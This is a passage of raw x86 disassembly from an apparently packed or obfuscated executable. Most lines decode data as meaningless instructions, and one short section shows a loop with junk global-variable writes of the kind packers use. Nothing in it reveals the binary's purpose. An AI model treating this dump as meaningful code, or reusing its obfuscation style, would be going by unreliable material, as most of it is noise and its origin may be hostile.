  40bc37:	sbb    dl,BYTE PTR [eax+0x64fc1d60]
  40bc3d:	fs mov ch,ah
  40bc40:	cli    
  40bc41:	rcr    DWORD PTR ds:[edx],0xac
  40bc45:	sub    eax,0x290eda77
  40bc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc4b:	shl    DWORD PTR [ecx+0x63],cl
  40bc4e:	cmp    al,0xe8
  40bc50:	xor    eax,0xa5321e64
  40bc55:	mov    ds:0x440bca15,al
  40bc5a:	sub    cl,BYTE PTR [ebp+0x72]
  40bc5d:	call   0x29be:0x2259b667
  40bc64:	imul   ecx,DWORD PTR [esp+edi*2-0x6a99426a],0x7186f8db
  40bc6f:	sbb    eax,0x64ec5f71
  40bc74:	das    
  40bc75:	sti    
  40bc76:	xlat   BYTE PTR ds:[ebx]
  40bc77:	and    esp,esp
  40bc79:	(bad)  
  40bc7a:	loop   0x40bbfd
  40bc7c:	pop    eax
  40bc7d:	mov    ch,0xd
  40bc7f:	stos   DWORD PTR es:[edi],eax
  40bc80:	es js  0x40bc2d
  40bc83:	mov    dl,0x29
  40bc85:	nop
  40bc86:	and    al,0xaf
  40bc88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc89:	pushf  
  40bc8a:	xor    eax,DWORD PTR [ebx]
  40bc8c:	pop    esp
  40bc8d:	icebp  
  40bc8e:	ds hlt 
  40bc90:	jle    0x40bd0b
  40bc92:	jmp    0x40bd04
  40bc94:	fsub   DWORD PTR [edi]
  40bc96:	push   es
  40bc97:	cwde   
  40bc98:	(bad)  
  40bc99:	xchg   ecx,eax
  40bc9a:	ret    0xa6b3
  40bc9d:	test   al,0xeb
  40bc9f:	cmp    al,0x5c
  40bca1:	test   BYTE PTR [esi+ebp*8],ah
  40bca4:	(bad)  
  40bca5:	adc    eax,0xec4bc00f
  40bcaa:	and    eax,ebp
  40bcac:	enter  0x1ecb,0x19
  40bcb0:	add    ecx,DWORD PTR [ebx+ebx*4+0x75]
  40bcb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb5:	cmp    al,0xe9
  40bcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb8:	fistp  WORD PTR [edi-0x30]
  40bcbb:	nop
  40bcbc:	cwde   
  40bcbd:	push   ds
  40bcbe:	mov    bl,BYTE PTR [eax-0x3c]
  40bcc1:	xor    BYTE PTR [esi-0xefb155c],ah
  40bcc7:	ja     0x40bd01
  40bcc9:	(bad)  
  40bcca:	ins    DWORD PTR es:[edi],dx
  40bccb:	(bad)  
  40bccc:	gs scas eax,DWORD PTR es:[edi]
  40bcce:	loopne 0x40bcc6
  40bcd0:	sub    DWORD PTR [ebx*1-0x43d976b0],ebp
  40bcd7:	icebp  
  40bcd8:	sti    
  40bcd9:	jge    0x40bc86
  40bcdb:	jle    0x40bcd8
  40bcdd:	lock or BYTE PTR [edi-0x43],0x27
  40bce2:	faddp  st(6),st
  40bce4:	popa   
  40bce5:	jle    0x40bd3b
  40bce7:	inc    ecx
  40bce8:	(bad)  [edx]
  40bcea:	push   ebx
  40bceb:	pop    ds
  40bcec:	mov    DWORD PTR [edx*1+0x7dc77828],edi
  40bcf3:	std    
  40bcf4:	xor    DWORD PTR [edi+0x7d],0x30730301
  40bcfb:	test   BYTE PTR [ebp+0x68],al
  40bcfe:	xchg   esi,eax
  40bcff:	fsubr  DWORD PTR [ecx+0x182ba228]
  40bd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd06:	and    cl,ah
  40bd08:	xchg   edi,eax
  40bd09:	mov    cl,0x79
  40bd0b:	stc    
  40bd0c:	icebp  
  40bd0d:	idiv   BYTE PTR [ebp+0x0]
  40bd10:	int    0x74
  40bd12:	loop   0x40bd39
  40bd14:	mov    bl,0xea
  40bd16:	cld    
  40bd17:	xabort 0xe5
  40bd1a:	not    DWORD PTR [ebx+esi*8]
  40bd1d:	pushf  
  40bd1e:	dec    ebx
  40bd1f:	enter  0x1805,0x14
  40bd23:	jnp    0x40bd23
  40bd25:	cmp    BYTE PTR [edx+esi*1-0xcf5ca30],al
  40bd2c:	shr    BYTE PTR [edx-0x404e6e90],1
  40bd32:	add    eax,0x9dd69f03
  40bd37:	dec    esp
  40bd38:	jmp    0x5876:0x74d31ffa
  40bd3f:	xchg   ebp,eax
  40bd40:	sti    
  40bd41:	cmp    al,0xe8
  40bd43:	fdiv   DWORD PTR [edi+0x1b5a365f]
  40bd49:	imul   eax
  40bd4b:	jmp    0x1efdfc0b
  40bd50:	jo     0x40bd39
  40bd52:	imul   esi,ecx,0x9d736ddf
  40bd58:	cmp    BYTE PTR [ebx+0x52128704],ah
  40bd5e:	xor    bl,0x97
  40bd61:	cld    
  40bd62:	scas   al,BYTE PTR es:[edi]
  40bd63:	xor    al,0xe5
  40bd65:	ss push cs
  40bd67:	adc    eax,0x724567e6
  40bd6c:	push   ss
  40bd6d:	and    DWORD PTR [esi+0x44],edi
  40bd70:	push   cs
  40bd71:	(bad)  
  40bd72:	das    
  40bd73:	inc    ecx
  40bd74:	pop    ebx
  40bd75:	or     dh,ah
  40bd77:	push   ecx
  40bd78:	outs   dx,BYTE PTR ds:[esi]
  40bd79:	push   ecx
  40bd7a:	lods   al,BYTE PTR ds:[esi]
  40bd7b:	push   esp
  40bd7c:	int3   
  40bd7d:	sbb    al,0x9e
  40bd7f:	xchg   ecx,eax
  40bd80:	push   0x2c
  40bd82:	sahf   
  40bd83:	test   eax,0x20bfb232
  40bd88:	sti    
  40bd89:	loop   0x40bd1c
  40bd8b:	mov    DWORD PTR [ebp-0x6],ebp
  40bd8e:	adc    DWORD PTR [ecx],0x1e78601d
  40bd94:	jbe    0x40bdf4
  40bd96:	cmp    eax,0x73b941f2
  40bd9b:	and    al,0x5d
  40bd9d:	and    dl,BYTE PTR [ebx+0xbc13851]
  40bda3:	pusha  
  40bda4:	loop   0x40bdb6
  40bda6:	xor    al,0x30
  40bda8:	inc    esp
  40bda9:	dec    edi
  40bdaa:	xchg   DWORD PTR [ebx-0x626fc4d4],ecx
  40bdb0:	push   eax
  40bdb1:	js     0x40bd5c
  40bdb3:	es stos BYTE PTR es:[edi],al
  40bdb5:	push   ebp
  40bdb6:	hlt    
  40bdb7:	dec    ebp
  40bdb8:	pop    ds
  40bdb9:	mov    al,0xd3
  40bdbb:	mov    ch,0x0
  40bdbd:	mov    WORD PTR [ecx+0x273a659b],cs
  40bdc3:	sbb    eax,0x14d08666
  40bdc8:	(bad)
  40bdcc:	lock cdq 
  40bdce:	jb     0x40bd83
  40bdd0:	push   edx
  40bdd1:	in     al,0xee
  40bdd3:	icebp  
  40bdd4:	xchg   esp,eax
  40bdd5:	or     al,0x83
  40bdd7:	arpl   bp,dx
  40bdd9:	iret   
  40bdda:	(bad)  
  40bddb:	cmp    eax,0x4b2a2c2c
  40bde0:	inc    ebp
  40bde1:	add    BYTE PTR [edi-0x5c9c44ad],ah
  40bde7:	mov    ebx,esi
  40bde9:	dec    edx
  40bdea:	sbb    BYTE PTR [eax],cl
  40bdec:	cmp    BYTE PTR [edi-0x4a],0xb8
  40bdf0:	daa    
  40bdf1:	push   ecx
  40bdf2:	pusha  
  40bdf3:	jge    0x40bd7f
  40bdf5:	xor    eax,esi
  40bdf7:	cmp    eax,0x846f3029
  40bdfc:	pop    ds
  40bdfd:	inc    edi
  40bdfe:	pop    eax
  40bdff:	push   edx
  40be00:	js     0x40bdb7
  40be02:	pop    ebx
  40be03:	jp     0x40bded
  40be05:	or     eax,0x27c5ddac
  40be0a:	push   esi
  40be0b:	mov    al,ds:0x875e6c15
  40be10:	push   es
  40be11:	dec    esi
  40be12:	dec    esp
  40be13:	rcr    DWORD PTR [edx+0x7d2c989a],0x1a
  40be1a:	adc    al,0x27
  40be1c:	and    eax,DWORD PTR [ebp+0x35]
  40be1f:	add    al,0x3c
  40be21:	pushf  
  40be22:	shl    dl,0xfb
  40be25:	shl    DWORD PTR [edi+ebp*2-0x63faab32],cl
  40be2c:	clc    
  40be2d:	cmc    
  40be2e:	xchg   BYTE PTR [ecx],ch
  40be30:	sbb    bl,al
  40be32:	cdq    
  40be33:	test   DWORD PTR [edx],esp
  40be35:	loop   0x40be76
  40be37:	push   edi
  40be38:	lods   eax,DWORD PTR ds:[esi]
  40be39:	push   0x45c650e
  40be3e:	xor    edx,DWORD PTR [ebx]
  40be40:	rol    BYTE PTR [edi],cl
  40be42:	daa    
  40be43:	cs (bad) 
  40be46:	push   ds
  40be47:	adc    ebx,DWORD PTR [eax+0x2]
  40be4a:	push   ebp
  40be4b:	retf   0xcf23
  40be4e:	retf   
  40be4f:	add    bh,bl
  40be51:	dec    edi
  40be52:	cdq    
  40be53:	lock push 0xffffffbd
  40be56:	call   DWORD PTR [edi+edx*2+0x7]
  40be5a:	jo     0x40beca
  40be5c:	adc    eax,0xabe5fb76
  40be61:	(bad)  
  40be62:	aam    0x31
  40be64:	je     0x40be7f
  40be66:	int    0xce
  40be68:	xor    al,0x94
  40be6a:	push   ebp
  40be6b:	loope  0x40bed2
  40be6d:	pop    edx
  40be6e:	and    DWORD PTR [edx-0x79],ebp
  40be71:	add    eax,0xefb09b88
  40be76:	fwait
  40be77:	pop    es
  40be78:	ret    0xa5b
  40be7b:	and    DWORD PTR [ecx+0x40],0x76
  40be7f:	lods   al,BYTE PTR ds:[esi]
  40be80:	fldcw  WORD PTR ds:0x23cfe911
  40be86:	(bad)  
  40be88:	fistp  QWORD PTR [edi-0x14215f43]
  40be8e:	inc    eax
  40be8f:	push   cs
  40be90:	xchg   esp,eax
  40be91:	(bad)  
  40be92:	(bad)
  40be95:	cld    
  40be96:	pop    ss
  40be97:	ficom  DWORD PTR cs:[ebx+0x61c82d08]
  40be9e:	aaa    
  40be9f:	clc    
  40bea0:	and    al,0xcc
  40bea2:	popa   
  40bea3:	xor    al,al
  40bea5:	imul   ebp,DWORD PTR [eax-0x51],0xffffff9c
  40bea9:	cmc    
  40beaa:	aas    
  40beab:	cld    
  40beac:	or     eax,DWORD PTR ds:0x7d8b6032
  40beb2:	or     BYTE PTR [ecx+0x424435],ah
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	push   ebp
  40c013:	mov    esi,0xe9d49b1a
  40c018:	jp     0x40c094
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c082
  40c01f:	std    
  40c020:	sub    eax,0xe23ef00c
  40c025:	or     ah,al
  40c027:	inc    esp
  40c028:	add    dh,BYTE PTR [ecx]
  40c02a:	loope  0x40c007
  40c02c:	fisttp DWORD PTR [edx+eiz*1]
  40c02f:	mov    ch,BYTE PTR [edi-0xe79bf56]
  40c035:	pop    eax
  40c036:	in     al,dx
  40c037:	in     eax,0x8c
  40c039:	bound  ecx,QWORD PTR [edi-0x51]
  40c03c:	and    ebp,0xffffffde
  40c03f:	repz jno 0x40c0b8
  40c042:	jne    0x40c0c1
  40c044:	jle    0x40c0a6
  40c046:	push   ecx
  40c047:	clc    
  40c048:	mov    ebx,ss
  40c04a:	daa    
  40c04b:	icebp  
  40c04c:	dec    esi
  40c04d:	retf   0x280d
  40c050:	inc    esi
  40c051:	xor    al,0xe
  40c053:	mov    esi,0x994dcfc7
  40c058:	or     al,0x1b
  40c05a:	mov    bh,0xb7
  40c05c:	fs out dx,eax
  40c05e:	outs   dx,BYTE PTR ds:[esi]
  40c05f:	gs das 
  40c061:	(bad)  
  40c063:	push   es
  40c064:	fst    QWORD PTR [eax-0x7288b185]
  40c06a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c06b:	adc    eax,ecx
  40c06d:	popf   
  40c06e:	or     al,0x6c
  40c070:	mov    WORD PTR [ebp+edx*2-0x8d35b6],ss
  40c077:	leave  
  40c078:	sbb    cl,BYTE PTR [edx-0x54]
  40c07b:	fst    QWORD PTR [esi+0x18]
  40c07e:	arpl   WORD PTR [edi],cx
  40c080:	pop    edx
  40c081:	repnz xor al,0xb0
  40c084:	xchg   edx,eax
  40c085:	in     al,dx
  40c086:	xchg   ebx,eax
  40c087:	leave  
  40c088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c089:	loopne 0x40c01a
  40c08b:	out    0x7a,eax
  40c08d:	pop    ds
  40c08e:	(bad)  
  40c08f:	push   ss
  40c090:	std    
  40c091:	mov    bh,al
  40c093:	jne    0x40c023
  40c095:	sbb    dh,dh
  40c097:	test   al,0xf0
  40c099:	sbb    al,0xf4
  40c09b:	dec    edx
  40c09c:	xchg   BYTE PTR [ebp-0x26],cl
  40c09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a0:	pop    ds
  40c0a1:	and    eax,edx
  40c0a3:	bound  edi,QWORD PTR [ebx+eiz*1]
  40c0a6:	data16 adc al,0x98
  40c0a9:	mov    al,ds:0x9b83ecd4
  40c0ae:	sub    dh,dl
  40c0b0:	fmul   DWORD PTR [ebp-0x44922001]
  40c0b6:	mov    ebx,0x8e93eaa8
  40c0bb:	cmp    DWORD PTR [ebp+0x5c],ebx
  40c0be:	sar    DWORD PTR [ebx-0x39e3bdc7],1
  40c0c4:	cmp    esi,DWORD PTR [ebp-0x6b]
  40c0c7:	stc    
  40c0c8:	daa    
  40c0c9:	ds mov edx,0x8d85f372
  40c0cf:	jge    0x40c120
  40c0d1:	xchg   esi,eax
  40c0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d3:	loope  0x40c0f3
  40c0d5:	mov    dh,0x63
  40c0d7:	xor    DWORD PTR [edx-0x8],edi
  40c0da:	pop    ebx
  40c0db:	add    al,0xb1
  40c0dd:	or     DWORD PTR [edi+0x17],esi
  40c0e0:	inc    edi
  40c0e1:	idiv   BYTE PTR [edx-0x5e]
  40c0e4:	in     al,0x14
  40c0e6:	ficomp WORD PTR [ebp+esi*1+0x7a799857]
  40c0ed:	mov    ch,0xc
  40c0ef:	xchg   esi,eax
  40c0f0:	xchg   edi,eax
  40c0f1:	repz xlat BYTE PTR ds:[ebx]
  40c0f3:	and    BYTE PTR [ebx],ah
  40c0f5:	adc    DWORD PTR [ebx-0x21],esi
  40c0f8:	inc    ebp
  40c0f9:	ror    bl,cl
  40c0fb:	push   es
  40c0fc:	inc    BYTE PTR [eax]
  40c0fe:	jecxz  0x40c096
  40c100:	call   0xcd4d:0xa2957584
  40c107:	or     eax,0x7de2b25d
  40c10c:	sub    DWORD PTR [edi-0x1524acdd],ebp
  40c112:	push   edi
  40c113:	(bad)  
  40c114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c115:	lea    eax,ds:0xaf0d715c
  40c11b:	ss inc eax
  40c11d:	cmp    bh,bl
  40c11f:	jmp    0x40c0ec
  40c121:	cs jp  0x40c136
  40c124:	int    0xe2
  40c126:	fimul  WORD PTR [eax-0x47]
  40c129:	jnp    0x40c18f
  40c12b:	call   0xff:0xffe37ed5
  40c132:	loop   0x40c113
  40c134:	inc    esi
  40c135:	aaa    
  40c136:	not    ah
  40c138:	repz push ds
  40c13a:	adc    DWORD PTR [ecx+0x4d],0xffffff8e
  40c13e:	or     dh,BYTE PTR [esi-0x7266e136]
  40c144:	jns    0x40c1b2
  40c146:	scas   eax,DWORD PTR es:[edi]
  40c147:	scas   eax,DWORD PTR es:[edi]
  40c148:	cmp    bh,bh
  40c14a:	pop    ds
  40c14b:	xlat   BYTE PTR ds:[ebx]
  40c14c:	mov    ds:0x36feee1f,eax
  40c151:	push   ecx
  40c152:	test   al,0x11
  40c154:	jb     0x40c16b
  40c156:	sar    esi,0x37
  40c159:	and    eax,0xa831a665
  40c15e:	shr    al,0x1d
  40c161:	mov    al,0x87
  40c163:	or     dh,BYTE PTR [esp+ecx*4-0x4e172f40]
  40c16a:	mov    BYTE PTR [ebp-0xc222111],ch
  40c170:	sbb    esp,edx
  40c172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c173:	jl     0x40c192
  40c175:	jmp    0x40c0f9
  40c177:	jb     0x40c1f2
  40c179:	fnstenv [edx+0x365a4883]
  40c17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c180:	inc    edi
  40c181:	pop    ss
  40c182:	add    edx,ecx
  40c184:	push   ebx
  40c185:	mov    cl,0xd4
  40c187:	add    eax,0xa31efe02
  40c18c:	jno    0x40c182
  40c18e:	xor    DWORD PTR [eax],esp
  40c190:	sub    eax,DWORD PTR [eax-0x205366c0]
  40c196:	xchg   esi,eax
  40c197:	jae    0x40c1a5
  40c199:	sbb    al,0x21
  40c19b:	je     0x40c136
  40c19d:	pop    eax
  40c19e:	sbb    esi,DWORD PTR [edi-0xb3347d9]
  40c1a4:	mov    dl,0x76
  40c1a6:	mov    edi,0xfc1dd833
  40c1ab:	cmp    BYTE PTR [edx+0x74f8470b],cl
  40c1b1:	xchg   esp,eax
  40c1b2:	aam    0xc5
  40c1b4:	dec    ecx
  40c1b5:	sub    eax,0x9b3fd63
  40c1ba:	retf   
  40c1bb:	add    eax,0x728565a8
  40c1c0:	hlt    
  40c1c1:	mov    eax,0x31d1bfea
  40c1c6:	push   ss
  40c1c7:	test   al,0xf5
  40c1c9:	cs ret 0xe650
  40c1cd:	iret   
  40c1ce:	jmp    FWORD PTR [esi+0x5b]
  40c1d1:	jns    0x40c1fe
  40c1d3:	and    DWORD PTR [ebp+0x60f48912],ecx
  40c1d9:	mov    ebx,esi
  40c1db:	mov    cl,BYTE PTR [edi+ebx*4-0x4f]
  40c1df:	das    
  40c1e0:	push   ss
  40c1e1:	jae    0x40c1ee
  40c1e3:	ins    BYTE PTR es:[edi],dx
  40c1e4:	or     eax,0x55f26da0
  40c1e9:	pop    ebp
  40c1ea:	(bad)  
  40c1eb:	loop   0x40c25a
  40c1ed:	add    bl,BYTE PTR [eax+0x5c]
  40c1f0:	cdq    
  40c1f1:	lahf   
  40c1f2:	rol    DWORD PTR [eax+0xc050d74],cl
  40c1f8:	jmp    0xa40a71c4
  40c1fd:	pop    ebx
  40c1fe:	add    BYTE PTR [ecx-0x181d7022],0x4b
  40c205:	jle    0x40c1c5
  40c207:	das    
  40c208:	mov    ah,0x62
  40c20a:	cmp    cl,bh
  40c20c:	test   eax,0x1a1c9754
  40c211:	cmp    al,0x12
  40c213:	push   ebp
  40c214:	or     eax,0xeba6f6e7
  40c219:	lods   al,BYTE PTR ds:[esi]
  40c21a:	adc    edx,DWORD PTR [esi]
  40c21c:	fiadd  DWORD PTR [eax-0x7c42223]
  40c222:	and    esp,eax
  40c224:	and    bh,ch
  40c226:	jmp    0x49b17289
  40c22b:	les    esi,FWORD PTR [esi]
  40c22d:	inc    ebp
  40c22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c22f:	mov    esp,0x4a9d17d
  40c234:	lods   al,BYTE PTR ds:[esi]
  40c235:	or     BYTE PTR [esi-0x16],0x29
  40c239:	test   BYTE PTR [edi-0x3c],bh
  40c23c:	push   0x6f003573
  40c241:	cdq    
  40c242:	xchg   edi,eax
  40c243:	mov    dl,0x4a
  40c245:	or     al,0x78
  40c247:	or     ebp,DWORD PTR [edx+0x70139146]
  40c24d:	or     dl,ah
  40c24f:	bswap  esp
  40c251:	cmp    DWORD PTR [ebx+0x4c],esp
  40c254:	pop    ecx
  40c255:	cmp    al,0xe0
  40c257:	sub    eax,DWORD PTR [esi]
  40c259:	stos   BYTE PTR es:[edi],al
  40c25a:	mov    esp,DWORD PTR [ebp-0x41]
  40c25d:	out    0x39,eax
  40c25f:	lods   eax,DWORD PTR ds:[esi]
  40c260:	cmp    eax,0xe60ddb06
  40c265:	add    ah,al
  40c267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c268:	popf   
  40c269:	adc    ch,cl
  40c26b:	or     al,0x7
  40c26d:	mov    esi,0x5c2653af
  40c272:	sbb    BYTE PTR [esi+0x2],bl
  40c275:	ds loop 0x40c23a
  40c278:	arpl   WORD PTR [ecx+edx*1+0x27],ax
  40c27c:	les    edi,FWORD PTR [edx]
  40c27e:	push   cs
  40c27f:	cwde   
  40c280:	loop   0x40c2a5
  40c282:	daa    
  40c283:	nop
  40c284:	mov    edi,0x53a9fec
  40c289:	push   cs
  40c28a:	sub    esp,esp
  40c28c:	imul   edi,DWORD PTR [eax+edi*1-0x3742318a],0xc0828fc7
  40c297:	fcmovu st,st(3)
  40c299:	inc    ebp
  40c29a:	add    al,0x4f
  40c29c:	sub    DWORD PTR [esi+0x7f8f41bc],ecx
  40c2a2:	xor    DWORD PTR [edx],0xffffffc7
  40c2a5:	mov    esi,0xb6df15f3
  40c2aa:	repz dec ebx
  40c2ac:	pop    esi
  40c2ad:	call   0xcae4:0xbdefdab9
  40c2b4:	jmp    0x40c29a
  40c2b6:	and    BYTE PTR [esp+eiz*8-0x47aaef46],0xbf
  40c2be:	loope  0x40c28b
  40c2c0:	repnz mov al,ds:0x5238078e
  40c2c6:	jne    0x40c26f
  40c2c8:	cdq    
  40c2c9:	repnz pop ecx
  40c2cb:	rol    DWORD PTR [esi],1
  40c2cd:	test   DWORD PTR [eax+0x7],esp
  40c2d0:	add    eax,0x1b854750
  40c2d5:	adc    ecx,ebp
  40c2d7:	rcr    DWORD PTR [ebp-0x67],1
  40c2da:	xchg   ecx,eax
  40c2db:	or     eax,0xb6542bfb
  40c2e0:	mov    ss,esp
  40c2e2:	push   es
  40c2e3:	mov    ah,0x19
  40c2e5:	mov    esi,0xaa8fde0b
  40c2ea:	lods   al,BYTE PTR ds:[esi]
  40c2eb:	sahf   
  40c2ec:	dec    esi
  40c2ed:	xchg   BYTE PTR [eax-0x7d],al
  40c2f0:	retf   0xf87f
  40c2f3:	sub    eax,ebx
  40c2f5:	inc    ecx
  40c2f6:	inc    ebx
  40c2f7:	sbb    al,0x1e
  40c2f9:	cmp    esp,0x6f
  40c2fc:	ds fcmovb st,st(5)
  40c2ff:	retf   
  40c300:	xor    ch,BYTE PTR [eax-0x49]
  40c303:	les    edx,FWORD PTR [eax]
  40c305:	mov    ecx,0x73a8fb1c
  40c30a:	pushf  
  40c30b:	push   ebx
  40c30c:	xchg   edx,eax
  40c30d:	pop    esp
  40c30e:	loope  0x40c312
  40c310:	mov    bl,0x7f
  40c312:	dec    ebx
  40c313:	std    
  40c314:	mov    eax,ds:0x6d5512ef
  40c319:	shl    BYTE PTR [ebx],cl
  40c31b:	xchg   ebp,eax
  40c31c:	sar    al,1
  40c31e:	jo     0x40c2b3
  40c320:	js     0x40c2e2
  40c322:	push   esp
  40c323:	psubq  mm4,QWORD PTR [ebx]
  40c326:	sbb    BYTE PTR [edx],dh
  40c328:	sahf   
  40c329:	test   eax,0xe26b90ed
  40c32e:	test   BYTE PTR [esp+ebp*4-0x7d],bl
  40c332:	inc    BYTE PTR [eax]
  40c334:	push   cs
  40c335:	jge    0x40c374
  40c337:	mov    ecx,0x7c53c15d
  40c33c:	dec    edx
  40c33d:	mov    ch,0x7b
  40c33f:	lea    edx,[esi+0x41bbd2f4]
  40c345:	push   edx
  40c346:	inc    esi
  40c347:	cs in  al,dx
  40c349:	push   0xffffffc0
  40c34b:	cmc    
  40c34c:	jp     0x40c321
  40c34e:	fiadd  WORD PTR [ebx+0x5f2c9b20]
  40c354:	out    0xbd,al
  40c356:	or     eax,0xac91323e
  40c35b:	inc    esp
  40c35c:	mov    BYTE PTR [edi],0x61
  40c35f:	call   0xc5b2:0x72060647
  40c366:	aad    0x31
  40c368:	fnstsw WORD PTR ds:0xb60f4926
  40c36e:	jno    0x40c3ea
  40c370:	xor    DWORD PTR [ebp-0x567d1062],0xffffff84
  40c377:	outs   dx,DWORD PTR ds:[esi]
  40c378:	call   DWORD PTR [ecx+0x23f9ab9c]
  40c37e:	or     ah,ch
  40c380:	repz adc al,BYTE PTR [ebp-0x579c33cd]
  40c387:	lods   al,BYTE PTR ds:[esi]
  40c388:	sbb    eax,0x8e423b5f
  40c38d:	in     al,dx
  40c38e:	push   edi
  40c38f:	(bad)  
  40c390:	xor    bh,al
  40c392:	mov    edi,0x972c42dd
  40c397:	pop    dx
  40c399:	in     al,0x94
  40c39b:	pop    eax
  40c39c:	mov    edi,DWORD PTR [ecx+0x17ae7e5a]
  40c3a2:	and    eax,0xb0c08d42
  40c3a7:	cli    
  40c3a8:	push   0xe05f6856
  40c3ad:	sar    ch,0x99
  40c3b0:	ror    DWORD PTR [esi],cl
  40c3b2:	sub    BYTE PTR ss:[ebx-0x1125bcd3],0x21
  40c3ba:	retf   
  40c3bb:	add    eax,0x6e12c3d7
  40c3c0:	or     al,0xf8
  40c3c2:	adc    al,0xc6
  40c3c4:	lods   eax,DWORD PTR ds:[esi]
  40c3c5:	mov    edi,eax
  40c3c7:	inc    ecx
  40c3c8:	jmp    0x69e9:0x7435a052
  40c3cf:	or     BYTE PTR [ecx],cl
  40c3d1:	mov    edx,0x3c7b0be7
  40c3d6:	adc    bh,BYTE PTR [ecx-0x3f]
  40c3d9:	sub    al,0xa
  40c3db:	ds nop
  40c3dd:	cmc    
  40c3de:	sysexit 
  40c3e0:	in     eax,dx
  40c3e1:	and    dh,BYTE PTR [edi]
  40c3e3:	sar    DWORD PTR [edx+ebp*2],1
  40c3e6:	jnp    0x40c3c0
  40c3e8:	add    eax,0x2132398d
  40c3ed:	je     0x40c440
  40c3ef:	in     eax,dx
  40c3f0:	mov    ah,0xc5
  40c3f2:	retf   0x52e4
  40c3f5:	iret   
  40c3f6:	pop    esp
  40c3f7:	stos   BYTE PTR es:[edi],al
  40c3f8:	clc    
  40c3f9:	nop
  40c3fa:	pop    esp
  40c3fb:	enter  0x9d09,0x47
  40c3ff:	fwait
  40c400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c401:	ja     0x40c39b
  40c403:	(bad)  
  40c404:	out    0xd6,al
  40c406:	or     ah,BYTE PTR [ecx+0x2a]
  40c409:	scas   eax,DWORD PTR es:[edi]
  40c40a:	sti    
  40c40b:	push   edx
  40c40c:	lods   al,BYTE PTR ds:[esi]
  40c40d:	sbb    BYTE PTR [edi+0x13f85253],0xdc
  40c414:	xchg   edx,ebp
  40c416:	stos   BYTE PTR es:[edi],al
  40c417:	inc    ecx
  40c418:	fsub   QWORD PTR [edx+ecx*4+0xd7bd0c7]
  40c41f:	mov    WORD PTR [eax+0x55],gs
  40c422:	push   cs
  40c423:	aas    
  40c424:	in     eax,dx
  40c425:	xor    DWORD PTR [edx],edi
  40c427:	call   0x66309785
  40c42c:	mov    ah,0xce
  40c42e:	repnz arpl di,si
